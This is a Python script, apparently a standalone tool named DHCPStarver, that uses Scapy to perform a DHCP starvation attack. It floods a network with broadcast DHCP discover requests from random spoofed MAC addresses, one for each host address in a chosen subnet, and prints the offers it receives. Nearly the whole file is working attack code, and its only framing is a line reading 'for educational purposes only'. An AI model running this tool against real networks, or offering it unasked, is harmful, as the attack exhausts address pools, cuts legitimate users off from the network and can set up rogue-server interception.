import netaddr
import argparse
import netifaces
from scapy.all import *



def displayBanner():
# With a banner...it's always better !

    # Clear console (Linux command !)
    os.system('clear')

    print(r"""
     _____  _    _  _____ _____     _                            
    |  __ \| |  | |/ ____|  __ \   | |                           
    | |  | | |__| | |    | |__) |__| |_ __ _ _ ____   _____ _ __ 
    | |  | |  __  | |    |  ___/ __| __/ _` | '__\ \ / / _ \ '__|
    | |__| | |  | | |____| |   \__ \ || (_| | |   \ V /  __/ |   
    |_____/|_|  |_|\_____|_|   |___/\__\__,_|_|    \_/ \___|_|   
                                                                        
    """)

    return

# ---------------------------------------------------------------------------------------------------------

def makeDHCPRequest(interface, nb, timeOut, debug):
# Function to craft simple DHCP discover request with loop
    
    conf.checkIPaddr = False

    if timeOut > 3:
        displayInfo = True
    else:
        displayInfo = False

    # Get a random MAC address
    randomMac = RandMAC()

    # Craft DHCP discover request
    ethernet = Ether(dst='ff:ff:ff:ff:ff:ff', src=randomMac)
    ip       = IP(src ='0.0.0.0', dst='255.255.255.255')
    udp      = UDP (sport=68, dport=67)
    bootp    = BOOTP(op=1, chaddr=randomMac)
    dhcp     = DHCP(options=[("message-type","discover"),('end')])
    packet   = ethernet / ip / udp / bootp / dhcp

    print(f"[+] Craft and send frame with {randomMac} mac address")

    # Send DHCP discover request through specified interface
    for i in range(nb):
        # If user choose only 1 retry, don't display "Send packet 1/X"...useless
        if nb > 1 and displayInfo:
            print(f"Send frame [{i + 1}/{nb}]")

        answer, unanwser = srp(packet,iface = interface, multi = True, verbose = debug, timeout = timeOut)

        # If an answer is given, quit the for loop
        # Sometime, Scapy don't receive answer, but Wireshark does...
        if answer:
            break

    # If no answer received
    if not answer and displayInfo:
        print("[-] Scapy failed to recover DHCP offer, may be with another sniffer...\n")
    # Else if we have an answer from a DHCP server
    elif answer and displayInfo:
        # Loop on the answer, to extract send/receive part
        for snd,rcv in answer:
            # Extract IP of DHCP server
            ipSrv = rcv.sprintf(r"%IP.src%")
            # Extract mac address of DHCP server
            macSrv = rcv.sprintf(r"%Ether.src%")
            # Extract offered IP
            ipOffer = rcv.sprintf(r"%IP.dst%")
        # Finally print received DHCP offder
        print(f"[+] DHCP offer : {ipOffer} (from {macSrv} - {ipSrv})\n")
        
        # Regex from D@d@
        # re.findall('([0-9]*.[0-9]*.[0-9]*.[0-9]*):bootpc /', str(answer))
        
    return


# -----------------------------------------------------------
#                      ArgsParse section
# -----------------------------------------------------------



# Define description about script
parser = argparse.ArgumentParser(

formatter_class=argparse.RawDescriptionHelpFormatter,

description="""
DHCPStarver is a tool to perform a DHCP starvation attack : \n
# -------------------------------- #
#  For educationnal purposes only  #
# -------------------------------- #

"""
)

# Add arguments 
parser.add_argument('-i', help='Interface used to make DHCP discover (e.g eth0)', required=True)
parser.add_argument('-s', help='Specify a subnet with CIDR notation (e.g 192.168.0.0/24)',required=True)
parser.add_argument('-t', help='Specify timeout for each packet (in seconds, default 0)', default=0, type=int)
parser.add_argument('-r', help='Number of retry for each packet (default 0)', default=0, type=int)
parser.add_argument('-d', help='Enable scapy debug mode (False if ommited)', action="store_true",default=False)

displayBanner()

# Parse arguments
args = parser.parse_args()


# If no arguments given in command line
# Print help section
if len(sys.argv)==1:
    parser.print_help(sys.stderr)
    exit()

# Define a network in CIDR notation
subnet = args.s
# Define interface used for dhcp spoofed request
interface = args.i
# Number of request by mac address
nb = args.r
# If default value is 0, make at last one request
if nb == 0:
    nb = 1
# Define timeout (in seconds) for each DHCP discover request
timeOut = args.t
# Define a debug variable for Scapy
debug = args.d

# Check if interface exist in the host
if interface not in netifaces.interfaces():
    print(f"[!] Interface {interface} don't exist")
    exit()


# Try/Except to avoid error in network notation
try:
    netAddress = netaddr.IPNetwork(subnet,implicit_prefix=False)

    # If the network CIDR is greater or equal to 31
    # /31 allow only 2 hosts in the network
    # /32 don't allow any hosts in network...
    if netAddress.prefixlen >= 31:
        print("[!] Please specify a CIDR lower than 31 or 32")
        exit()
except netaddr.AddrFormatError as e:
    print("[!] Please specify a valid network address : ")
    print(f"[!] {e}")
    exit()



# --------------------------------------------------------
# ------------------------- Main -------------------------
# --------------------------------------------------------

# Answer analyzing from 
# https://0xbharath.github.io/art-of-packet-crafting-with-scapy/scapy/sending_recieving/index.html

# Hypothetic futur DHCP server 
# http://pydhcplib.tuxfamily.org/pmwiki/index.php?n=Site.ServerExample

# -------------------------------------------------- #
# < Thanks for D@D@ from Montpellier for his regex > #
# -------------------------------------------------- #
#  View the last line of makeDHCPRequest() function  #
# -------------------------------------------------- #

# Get ip range with netaddr library
# .iter_host() allow to get only 'hostable' ip
ipRange = netaddr.IPNetwork(subnet).iter_hosts()

# Simple loop to make DHCP discover request on the IP range
for index,ip in enumerate(ipRange):

    makeDHCPRequest(interface, nb, timeOut, debug)






